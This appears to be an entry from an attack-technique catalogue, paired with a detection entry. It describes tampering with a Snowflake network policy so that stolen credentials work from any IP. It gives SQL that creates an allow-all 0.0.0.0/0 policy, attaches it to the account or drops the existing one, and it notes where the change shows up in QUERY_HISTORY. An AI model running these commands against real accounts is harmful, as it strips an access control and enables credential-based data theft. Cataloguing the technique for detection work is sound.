---
id: snowflake-network-policy
title: Snowflake network-policy tamper (open the IP allowlist)
section: Snowflake / data cloud
phase: Defense Impairment
attack:
  tactic: TA0112
  techniques: [T1686.001]
platform: [snowflake]
source: Snowflake defense evasion (network-policy tamper)
pair: snowflake-network-policy-audit
---

A network policy is Snowflake's IP allowlist — the control that would have blocked the
2024 credential-stuffing from unknown IPs. Neutralize it: attach a permissive policy
(`0.0.0.0/0`) or drop the enforced one, so the stolen creds work from anywhere. The
change lands in `QUERY_HISTORY` with `NETWORK POLICY` in the query text. (Data cloud —
no slots.)

```sql
-- open the allowlist so the stolen login works from any IP
CREATE NETWORK POLICY allow_all ALLOWED_IP_LIST = ('0.0.0.0/0');
ALTER ACCOUNT SET NETWORK_POLICY = allow_all;   -- or: DROP NETWORK POLICY <existing>;
```
